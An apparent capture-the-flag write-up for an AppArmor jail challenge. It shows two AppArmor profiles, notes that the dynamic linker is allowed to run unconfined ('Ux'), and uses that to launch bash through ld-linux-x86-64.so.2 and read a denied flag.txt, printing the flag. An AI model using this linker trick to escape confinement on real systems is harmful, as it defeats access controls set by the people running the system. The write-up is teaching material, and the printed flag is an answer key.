---
layout: default
title: AppArmor-Jail-Introduction
---
In this challenge we get this `AppArmor` config file:
```
#include <tunables/global>  
  
profile docker_chall01 flags=(attach_disconnected,mediate_deleted) {  
   #include <abstractions/base>  
   network,  
   capability,  
   file,  
   umount,  
   signal (send,receive),  
   deny mount,  
  
   deny /sys/[^f]*/** wklx,  
   deny /sys/f[^s]*/** wklx,  
   deny /sys/fs/[^c]*/** wklx,  
   deny /sys/fs/c[^g]*/** wklx,  
   deny /sys/fs/cg[^r]*/** wklx,  
   deny /sys/firmware/** rwklx,  
   deny /sys/kernel/security/** rwklx,  
  
   deny @{PROC}/* w,   # deny write for all files directly in /proc (not in a subdir)  
   # deny write to files not in /proc/<number>/** or /proc/sys/**  
   deny @{PROC}/{[^1-9],[^1-9][^0-9],[^1-9s][^0-9y][^0-9s],[^1-9][^0-9][^0-9][^0-9]*}/** w,  
   deny @{PROC}/sys/[^k]** w,  # deny /proc/sys except /proc/sys/k* (effectively /proc/sys/kernel)  
   deny @{PROC}/sys/kernel/{?,??,[^s][^h][^m]**} w,  # deny everything except shm* in /proc/sys/kernel/  
   deny @{PROC}/sysrq-trigger rwklx,  
   deny @{PROC}/kcore rwklx,  
  
   /home/app-script-ch27/bash px -> bashprof1,  
   
}  
profile bashprof1 flags=(attach_disconnected,mediate_deleted) {  
   #include <abstractions/base>  
   #include <abstractions/bash>  
     
   network,  
   capability,  
   deny mount,  
   umount,  
   signal (send,receive),  
  
   deny /sys/[^f]*/** wklx,  
   deny /sys/f[^s]*/** wklx,  
   deny /sys/fs/[^c]*/** wklx,  
   deny /sys/fs/c[^g]*/** wklx,  
   deny /sys/fs/cg[^r]*/** wklx,  
   deny /sys/firmware/** rwklx,  
   deny /sys/kernel/security/** rwklx,  
  
   deny @{PROC}/* w,   # deny write for all files directly in /proc (not in a subdir)  
   # deny write to files not in /proc/<number>/** or /proc/sys/**  
   deny @{PROC}/{[^1-9],[^1-9][^0-9],[^1-9s][^0-9y][^0-9s],[^1-9][^0-9][^0-9][^0-9]*}/** w,  
   deny @{PROC}/sys/[^k]** w,  # deny /proc/sys except /proc/sys/k* (effectively /proc/sys/kernel)  
   deny @{PROC}/sys/kernel/{?,??,[^s][^h][^m]**} w,  # deny everything except shm* in /proc/sys/kernel/  
   deny @{PROC}/sysrq-trigger rwklx,  
   deny @{PROC}/kcore rwklx,  
  
   / r,  
   /** mrwlk,  
   /bin/** ix,  
   /usr/bin/** ix,  
   /lib/x86_64-linux-gnu/ld-*.so mrUx,  
   deny /home/app-script-ch27/flag.txt r,  
}
```

We can see that it allows us to read all files `/** mrwlk`, and that all binary files inherit the current `AppArmor` profile.
Of course, it blocks the read permission from the `flag.txt`

However, on the line before the last one, we can see the next rule:

```
   /lib/x86_64-linux-gnu/ld-*.so mrUx,  
```

It says that these files **don't** inherit the `AppArmor` profile, rather have nothing.
Since this is a linker, we can spawn a shell based on the linker there:

```bash
app-script-ch27@2b2a697a0a0f:~$ ls -la /lib/x86_64-linux-gnu/ld*
-rwxr-xr-x 1 root root 179152 May  3  2022 /lib/x86_64-linux-gnu/ld-2.27.so
lrwxrwxrwx 1 root root     10 May  3  2022 /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 -> ld-2.27.so
```

We'll use the linker `/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2`, both linkers will do the same

```bash
app-script-ch27@2b2a697a0a0f:~$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
app-script-ch27@2b2a697a0a0f:~$ cat flag.txt
M4nd4t0ry_4cc3ss_C0ntr0l_J0k3
```

we got the flag **M4nd4t0ry_4cc3ss_C0ntr0l_J0k3**
